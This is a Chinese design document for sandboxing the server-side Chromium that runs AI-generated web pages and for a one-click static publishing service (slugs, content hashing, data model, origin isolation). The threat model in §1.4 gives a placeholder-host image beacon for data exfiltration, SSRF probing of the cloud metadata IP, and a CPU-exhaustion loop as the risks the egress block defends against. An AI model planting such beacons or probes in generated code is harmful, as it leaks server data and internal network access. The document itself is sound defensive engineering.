# 设计文档：运行时沙箱加固 + 一键发布

> 状态：**待确认**（头脑风暴产物）。确认后进入实施阶段。
> 作者：Leon + AI · 2026-09-21

---

## 1. 背景：三个运行时，两条 evolutionary 主线

同一份生成产物在三个完全不同的上下文里被加载。把这三件事混为一谈，
是之前所有讨论容易跑偏的根因。

| # | 上下文 | 位置 | 当前隔离强度 |
|---|---|---|---|
| ① | **预览** | 用户浏览器 | iframe `sandbox` + CSP `sandbox`（双保险，见证据 1.2） |
| ② | **验收** | **服务器本机 Chromium** | 无隔离（见证据 1.3）—— 真正的缺口 |
| ③ | **发布** | 独立 apex 域名 | 尚不存在 |

### 1.1 产物契约（决定了整个方案的天花板）

`backend/harness/constraints/environment_contract.py:28-80` 是唯一权威来源：

- **ENV-1** 静态单页、`index.html` 唯一入口、相对路径、离线可用
- **ENV-2** 禁止任何 `http(s)://` 外部资源
- **ENV-3** 禁止 ES Module，只允许 classic script + IIFE
- **ENV-4** 存储访问必须 try/catch 兜底
- **ENV-5** 主交互入口初始可见
- **ENV-6** 本地引用闭合

**结论**：产物被锁死为纯静态 bundle。发布侧因此**不需要起进程、不需要端口池、
不需要容器编排** —— 这是本方案能做到极简的根本原因。

### 1.2 预览为什么要叠两层 sandbox

- `frontend-vue/src/components/detail/PreviewFrame.vue:33`：`sandbox="allow-scripts allow-forms"`
- `backend/routes/preview.py:213-226`：响应头 `Content-Security-Policy: sandbox allow-scripts allow-forms`

第二层的存在理由是：**用户可能把能力 URL 直接贴到地址栏打开**，那时没有 iframe 保护。

两层都**没有 `allow-same-origin`** —— iframe 因此是 opaque origin，
主站 cookie / DOM / storage 全部读不到。隔离有效，但代价是下一个问题。

### 1.3 预览环境的隐性代价：产物不能持久化

缺少 `allow-same-origin` ⇒ 任何 `localStorage` / `sessionStorage` 访问抛 `SecurityError`。

这正是 ENV-4 逼 LLM 写 try/catch 的**真实原因** —— 那个 try 不是防御性编程，
是**每次都必然走到的降级分支**。贪吃蛇存不了最高分、待办刷新就丢。

预览期可以忍；一旦「一键发布」，用户会当成 bug。
所以发布环境**必须放开 `same-origin`**，而这一放就把 §1.4 的隔离问题提到了台面上。

### 1.4 服务端验收：真正的沙箱缺口

`backend/harness/tools/preview_runner.py` 有 **4 处** `p.chromium.launch(headless=True)`：

| 行号 | 用途 |
|---|---|
| 80 | `run_preview_in_browser` 收集 console/error/requestfailed |
| 369 | `run_ac_checks` 跑 AC 断言 |
| 569 | `capture_screenshot` 截图 |
| 799 | `run_universal_smoke` 通用冒烟 |

这些 Chromium **跑在服务器上，执行的是 LLM 刚写出来的 JS**。iframe sandbox
只约束子帧代码能碰什么，挡不住两件事：

1. **网络出口**：页面里任何 `<img src="http://x/?c=...">` 都以**服务器 IP** 发出
   → 数据外带、SSRF 探内网（`169.254.169.254` 元数据服务）
2. **资源占用**：`while(true)` 吃满一个 CPU 核；`TASK_QUEUE_MAX_WORKERS=3`，
   三发就能拖垮整机

> `run_universal_smoke` 的 `self_contained`（禁 CDN）是**检测而非拦截** ——
> 违规时判失败，但那一次请求已经飞出去了。这是本设计要修的 P0。

---

## 2. 目标 / 非目标

**目标**

- G1 服务端验证浏览器：默认**零外部网络出口**，且知情的内部访问仍然可用
- G2 产物可一键发布为一个可分享的 URL，且**的这个 URL 与内容解耦**（支持迭代重发）
- G3 已发布站点之间、以及已发布站点与主站之间，**origin 隔离**
- G4 发布后环境和预览环境不等价 ⇒ **发布后必须重跑验收**（见 §6）
- G5 v1 就只能只 Rover Tier 0（静态），但数据结构和路由层为 Tier 1/2 留口

**非目标（明确不做）**

- 不做内容级加密（`#fragment` 密钥模式）—— 待 B系列语义被真正需要时再单独立项
- 不做 Tier 2 容器运行时 —— 只留字段和路由分支
- 不做历史版本回滚 UI —— 数据层留 `version`，UI 不实现
- 不做 CDN 选型迁移 —— `ObjectStore` 抽象就位即可，v1 用本地 FS

---

## 3. 核心抽象：三个分离

整个方案的骨架就这三行：

| 分离 | 为什么 | 落地形式 |
|---|---|---|
| **slug ↔ 内容** | 用户改完再发，URL 必须不变 | `published_sites.slug` 与 `published_bundles.content_hash` 两张表 |
| **内容 ↔ 存储位置** | 今天本地目录，明天 COS/R2，迁移不改表 | `ObjectStore` protocol，只有 3 个方法 |
| **运行时 ↔ 路由** | 今天全静态，以后可能有容器 | `published_sites.runtime_tier`，网关按 tier 分发 |

### 3.1 `content_hash`

```
content_hash = sha256( "\0".join(sorted(f"{relpath}\0{sha256(bytes)}" for ...)) )
```

特点：内容寻址 ⇒ 重复发布同一份产物**零写入**、可 `Cache-Control: immutable` 强缓存、
天然去重。slug 与 hash 分离是「同一个短链指向新版本」的唯一前提。

### 3.2 slug

- **12 字节随机 → Crockford Base32 → 20 字符**（96 bit）
- 碰撞：唯一约束 + 冲突重试即可，不需要额外仪式
- 语义：**不可枚举**，不是「保密」。任何拿到 slug 的人都能访问 distinguish

### 3.3 `ObjectStore`

```python
class ObjectStore(Protocol):
    def put_bundle(self, content_hash: str, files: dict[str, bytes]) -> str: ...
    def get(self, key: str) -> bytes: ...
    def exists(self, content_hash: str) -> bool: ...
```

v1 唯一实现 `LocalFSStore`，落盘 `PUBLISH_STORE_DIR/{hash[:2]}/{hash}/...`。
换成 S3 时只新增一个实现类，不动任何调用方。

---

## 4. 数据模型

**不改 `requirements` 表**（它现在已经有 8 列且承担过多职责）。

```python
class PublishedBundle(Base):
    """不可变产物（内容寻址）"""
    __tablename__ = "published_bundles"

    content_hash = Column(String(64), primary_key=True)
    store_key    = Column(String(255), nullable=False)
    size_bytes   = Column(Integer, default=0)
    file_count   = Column(Integer, default=0)
    entry        = Column(String(64), default="index.html")
    created_at   = Column(DateTime, default=func.now())


class PublishedSite(Base):
    """发布槽位（可变指针）"""
    __tablename__ = "published_sites"

    id              = Column(Integer, primary_key=True, autoincrement=True)
    slug            = Column(String(32), unique=True, nullable=False, index=True)
    user_id         = Column(Integer, ForeignKey("users.id"), nullable=False, index=True)
    requirement_id  = Column(Integer, nullable=True, index=True)   # 不加 FK：需求删除后站点可保留
    title           = Column(String(500), default="")
    runtime_tier    = Column(SmallInteger, default=0)              # 0=static（v1 唯一值）
    visibility      = Column(String(16), default="unlisted")       # public / unlisted
    current_hash    = Column(String(64), ForeignKey("published_bundles.content_hash"), nullable=True)
    version         = Column(Integer, default=1)
    view_count      = Column(Integer, default=0)
    created_at      = Column(DateTime, default=func.now())
    updated_at      = Column(DateTime, default=func.now(), onupdate=func.now())
```

**幂等语义**（单个 slug 的演进规则）：

- 内容变了 ⇒ 存新 bundle、`current_hash` 指向新值、`version += 1`，**slug 不变**
- 内容没变（`content_hash` 相同）⇒ 完全无写入，连 `version` 都不动
- `(user_id, requirement_id)` 与站点是**一对一**；重复发布同一个需求更新同一个站点

---

## 5. 组件设计

### 5.1 Ship A — 运行时加固（P0，先做）

新增 `backend/harness/tools/sandboxed_browser.py`：

```python
@contextmanager
def sandboxed_browser(*, allow_hosts: tuple[str, ...] = (), timeout_ms: int = 30_000):
    """统一出口封锁 + 资源看护的 Chromium 上下文。

    出口双重封锁的理由：--host-resolver-rules 只拦 DNS 名字，拦不住
    直接写 IP 的请求（云元数据 169.254.169.254）；--proxy-server 拦得住两者。
    """
```

启动参数：

```
--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE 127.0.0.1, EXCLUDE localhost
--proxy-server=http://127.0.0.1:9              # 黑洞代理
--proxy-bypass-list=127.0.0.1;localhost;<local>
--no-first-run --no-default-browser-check
--disable-background-networking --disable-component-update
```

> **易错点 ①（必须写进测试）**：`<-loopback>` 在 Chrome 的 bypass 语法里是
> **减法**——它把「隐式 bypass loopback」这条规则**去掉**，方向正好相反，
> 会把 127.0.0.1 的预览请求也送进黑洞代理，导致验收链路静默降级（见 §5.1 下方）。
> 正确做法是给**正向**清单，或者干脆不传 `--proxy-bypass-list`
> （Chrome 默认就绕代理访问 loopback）。
>
> **易错点 ②（A9b 集成测试已抓出）**：`MAP * ~NOTFOUND` 的 `*` 会匹配**数字 IP**，
> 把 `127.0.0.1` 也解析成 NOTFOUND；`EXCLUDE localhost` 只豁免主机名 `localhost`，
> 救不了数字 IP。预览 URL 用的是 `http://127.0.0.1:5001`（数字 IP），因此 resolver
> 里必须**显式 `EXCLUDE 127.0.0.1`**，否则预览请求 `ERR_NAME_NOT_RESOLVED`、
> 验收整片静默假绿。proxy-bypass-list 的 `127.0.0.1` 只解决代理方向，
> resolver 方向必须单独 EXCLUDE，两个方向缺一不可。

并把 `preview_runner.py` 的 **4 处** launch 全部换成它。

**资源看护的现实主义选择**：

- Playwright 所有操作都带 timeout，所以不存在永久挂起，最坏是「烧 CPU 到超时」
- v1 不做 cgroup / setrlimit —— 收益与复杂度不成比例，**等到真实事件发生再加**
- 但加一个 **wall-clock watchdog**：整个 `sandboxed_browser` 超过 `timeout_ms * 1.5`
  仍未退出就 `browser.close()` 并记录告警

> 明确的取舍登记：如果后续实测发现 CPU 被打满影响在线请求，再升级到
> 进程级 RLIMIT_CPU / 独立 worker。

### 5.2 Ship B — 发布链路

```
POST /api/publish            body: {"requirement_id": 123, "visibility": "unlisted"}
POST /api/publish/<slug>/unpublish
GET  /api/publish/<slug>/info                      # 发布状态，前端展示用
GET  /  (Host: <slug>.<PUBLISH_APEX>)              # 已发布站点本身
```

`PublishService.publish()` 流程：

1. 取 `requirement.code_files` → 归一化 `{relpath: bytes}`
2. **跑同样的静态契约检查**（ENV-2/3/6）—— 发布前这道门禁和验收共用一套代码
3. 计算 `content_hash` → 若 bundle 不存在则 `store.put_bundle()`
4. upsert `PublishedSite`（幂等）
5. **Returns 前触发 Ship C 的复验**

### 5.3 Ship C — 发布后复验（G4）

**为什么必须**：预览是 opaque origin（无存储），发布后的 apex 域名放开了
`same-origin` —— 两个环境**不等价**。会出现「预览全绿、上线拉胯」，
而且是那种最难复盘的差异。

做法：对 `{slug}.{apex}` 的真实 URL 重跑一遍 `run_universal_smoke` +
`run_ac_checks`（AC 脚本已在 `.task/ac_scripts.json` 缓存），
结果与 `requirement` 关联落 `published_sites` 的一行记录。
失败 ⇒ 发布标记为 `degraded`，前端明确提示，而不是假装成功。

### 5.4 路由与部署

```
{slug}.{PUBLISH_APEX}  →  网关解析 Host → 查 published_sites → runtime_tier
   tier 0 → 直接由 LocalFSStore / 未来的 CDN 返回静态文件
   tier 1 → 静态 + 平台 API（per-slug scoped token）—— 仅预留
   tier 2 → 反代到 per-site 容器 —— 仅预留
```

**关键点：不管哪个 tier，入口 hostname 永远同一个**。
将来上 Tier 2 不需要改动任何一个已发出去的短链。这就是现在多设计一个
`runtime_tier` 字段能换来的东西。

TLS 的现实解法：Let's Encrypt 的 wildcard 只能走 DNS-01 挑战。
把 apex 挂在 Cloudflare、开 proxy，用它的边缘证书即可免费获得 wildcard，
回源走 HTTP —— 绕掉整个 DNS-01 自动续期的运维负担。

**开发期**：没有 wildcard DNS 也能测。用 nip.io 一类的通配 DNS：
`http://my-slug-123.127.0.0.1.nip.io:5001/` 会解析到 `127.0.0.1`。

---

## 6. 安全红线（不可协商）

1. **已发布域名永远不承载任何鉴权 cookie**。这就是为什么必须是独立 apex
   而不是三级子域 —— 主域为 `talk2code.com` 时，其 httpOnly cookie
   （`backend/routes/auth.py:82`）对 `*.talk2code.com` **全部可读**，
   任意一份 AI 生成的代码都能读走登录态。
2. **每个站点必须独占 origin**。多个站点共享 apex 下不同路径的方式不可接受 ——
   那样 A 站能读 B 站的同源数据。所以 `{slug}.apex` 是硬性要求，不是偏好。
3. **默认 `unlisted` + `X-Robots-Tag: noindex`**。公开托管意味着替别人的
   滥用买单，起码别被搜索引擎收录。配举报入口（v1.5）。
4. **现有 preview token 不能拿来当永久短链**。
   `backend/utils/preview_token.py:36` 按 UTC 自然日滚动，跨日失效。
   必须新建持久 slug，不要在它上面打补丁。

---

## 7. 分级路线

| Tier | 形态 | 状态 |
|---|---|---|
| 0 | 纯静态托管 | **本次实现** |
| 1 | 静态 + 平台 API（KV / 文件上传），per-slug token | 仅落接口契约，不实现（YAGNI） |
| 2 | 真容器运行时 | 显式推迟 |

---

## 8. 开放问题

1. 发布是否要**允许同一需求多个站点**（类似多环境）？v1 假定一对一。
2. 产物体积上限多少？建议 v1 先卡 10MB / 100 个文件。
3. `unlisted` 站点是否需要过期清理？建议 v1 不清理，v1.5 加 90 天无访问归档。
